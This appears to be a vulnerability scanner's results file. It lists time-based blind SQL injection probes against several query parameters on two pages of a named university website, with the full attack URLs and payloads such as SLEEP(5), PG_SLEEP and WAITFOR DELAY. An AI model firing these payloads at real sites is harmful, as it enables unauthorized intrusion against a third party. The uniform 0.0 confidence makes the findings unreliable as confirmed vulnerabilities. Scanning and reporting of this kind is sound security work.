Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1764844103047-93059006-04ad),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1764844103047-93059006-04ad),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1764844103047-93059006-04ad),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=1%27+AND+SLEEP%285%29--#1764844103047-93059006-04ad),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1764844103047-93059006-04ad),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1764844103047-93059006-04ad),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=1%27+AND+SLEEP%285%29--#1764844103047-93059006-04ad),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1764844103047-93059006-04ad),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1764844103047-93059006-04ad),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=1+OR+SLEEP%285%29#1764844103047-93059006-04ad),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1764844103047-93059006-04ad),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1764844103047-93059006-04ad),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1764844103047-93059006-04ad),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1764844103047-93059006-04ad),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1764844103047-93059006-04ad),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1764844103047-93059006-04ad),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1764844103047-93059006-04ad),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1764844103047-93059006-04ad),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=1%27+AND+SLEEP%285%29--#1764844103047-93059006-04ad),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=1%27+AND+PG_SLEEP%285%29--#1764844103047-93059006-04ad),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1764844103047-93059006-04ad),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=1%27+AND+PG_SLEEP%285%29--#1764844103047-93059006-04ad),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1764844103047-93059006-04ad),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=1%27+AND+SLEEP%285%29--#1764844103047-93059006-04ad),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=1%27+AND+PG_SLEEP%285%29--#1764844103047-93059006-04ad),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=1+OR+SLEEP%285%29#1764844103047-93059006-04ad),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=1%27%3B+SELECT+PG_SLEEP%285%29--#1764844103047-93059006-04ad),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=1%27%3B+SELECT+PG_SLEEP%285%29--#1764844103047-93059006-04ad),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=1%27%3B+SELECT+PG_SLEEP%285%29--#1764844103047-93059006-04ad),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=SLEEP%285%29%23#1764844103047-93059006-04ad),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=1%27+AND+PG_SLEEP%285%29--#1764844103047-93059006-04ad),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=SLEEP%285%29%23#1764844103047-93059006-04ad),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=1%27%3B+SELECT+PG_SLEEP%285%29--#1764844103047-93059006-04ad),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=1%27+AND+PG_SLEEP%285%29--#1764844103047-93059006-04ad),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=1+OR+SLEEP%285%29#1764844103047-93059006-04ad),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--#1764844103047-93059006-04ad),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1764844103047-93059006-04ad),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?id=1+OR+SLEEP%285%29#1574017975212-eafa706d-27bf),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?search=1%27%3B+SELECT+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?q=1%27%3B+SELECT+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?id=1%27%3B+SELECT+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?q=1+OR+SLEEP%285%29#1574017975212-eafa706d-27bf),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574017975212-eafa706d-27bf),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574017975212-eafa706d-27bf),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574017975212-eafa706d-27bf),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574017975212-eafa706d-27bf),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574017975212-eafa706d-27bf),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574017975212-eafa706d-27bf),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?cmd=1%27+AND+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?file=SLEEP%285%29%23#1574017975212-eafa706d-27bf),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?search=1%27+AND+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?file=1%27+AND+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?q=1%27+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?query=1%27+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?q=1%27+AND+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?id=1%27+AND+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?id=1%27+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?search=1%27+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?page=1%27+AND+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?page=1%27+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?query=1%27+AND+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?page=1%22+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?query=1%22+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?search=1%22+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?q=1%22+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?id=1%22+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?query=1+OR+SLEEP%285%29#1574017975212-eafa706d-27bf),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?cmd=1%22+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?cmd=1+OR+SLEEP%285%29#1574017975212-eafa706d-27bf),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?cmd=1%27+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?page=1+OR+SLEEP%285%29#1574017975212-eafa706d-27bf),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?search=1+OR+SLEEP%285%29#1574017975212-eafa706d-27bf),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?file=1%22+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?file=1%27+AND+SLEEP%285%29--#1574017975212-eafa706d-27bf),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?page=1%27%3B+SELECT+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?query=SLEEP%285%29%23#1574017975212-eafa706d-27bf),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
